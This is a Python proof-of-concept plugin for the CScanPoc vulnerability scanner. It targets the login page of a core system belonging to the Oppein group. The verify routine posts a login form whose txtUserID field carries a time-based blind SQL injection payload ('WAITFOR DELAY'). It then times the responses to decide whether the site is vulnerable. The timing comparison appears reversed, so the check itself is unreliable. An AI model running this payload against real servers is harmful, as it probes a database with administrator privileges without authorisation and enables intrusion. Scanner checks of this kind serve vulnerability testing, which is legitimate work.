# coding: utf-8
import time

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Oppein_0101'  # 平台漏洞编号
    name = '欧派集团旗下核心系统存在SQL且权限为DBA'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-16'  # 漏洞公布时间
    desc = '''
    欧派集团旗下核心系统存在SQL且权限为DBA（时间盲注）。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=138297
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Oppein'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cb75d5e5-8730-4495-a3e3-ea2e3876426f'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            payload1 = '''__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUJNTU4MTMwNTc4ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAgULY2JJc1JlbWViZXIFDEltYWdlQnV0dG9uMRgx6d11G2zzWntRDJIZph4YGLVfZouvWjmVDOX9030f&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=%2FwEdAAdHo7ESDfB43eQm%2B%2BaON1gP9Tt6KoVd96dN6zOjIKoOlHY2%2BMc6SrnAqio3oCKbxYaDr609gOYlKV%2BbpnR3q6Cx6ZACrx5RZnllKSerU%2BIuKsmrE4D3DRrem1MsGaBV0yK61SaGzux4XzPTjGFgzHLb%2Fp0Y6tcT3dZFQrnTSmlg62gf3LfDgkRp4YSzbmd%2Bkow%3D&txtUserID=admin&txtPassword=admin&ImageButton1.x=47&ImageButton1.y=3&hidFileldBrowserName=chrome44.0.2403.157&hidFileldBrowserShell=chrome%E6%B5%8F%E8%A7%88%E5%99%A8'''
            payload2 = '''__LASTFOCUS=&__VIEWSTATE=/wEPDwUJNTU4MTMwNTc4D2QWAgIDD2QWAgIJDw8WAh4EVGV4dAUb55So5oi35Z
CN5oiW5a+G56CB6ZSZ6K+v77yBZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgIFC2NiSXNSZW1lYmVyBQxJbW
FnZUJ1dHRvbjGUTVIt9MPbBGiuZg4jaDZnl7GGp6LqcBtLSKtVgDP4lw==&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTTARG
ET=&__EVENTARGUMENT=&__EVENTVALIDATION=/wEdAAeUy/Z893jBDhlvaCCBA+8t9Tt6KoVd96dN6zOjIKoOlHY2+Mc6SrnAq
io3oCKbxYaDr609gOYlKV+bpnR3q6Cx6ZACrx5RZnllKSerU+IuKsmrE4D3DRrem1MsGaBV0yK61SaGzux4XzPTjGFgzHLb10b6b
QvRNPx/1qIXDYnt2YfQsDSjm01CMQ7LbBqb8j0=&txtUserID=admin';WAITFOR DELAY '0:0:5'--&txtPassword=admin&I
mageButton1.x=47&ImageButton1.y=3&hidFileldBrowserName=chrome44.0.2403.157&hidFileldBrowserShell=chr
ome%E6%B5%8F%E8%A7%88%E5%99%A8'''
            start_time = time.time()
            _response = requests.post(url, data=payload1)
            end_time1 = time.time()
            _response = requests.post(url, data=payload2)
            end_time2 = time.time()
            if (end_time1-start_time) - (end_time2-end_time1) > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
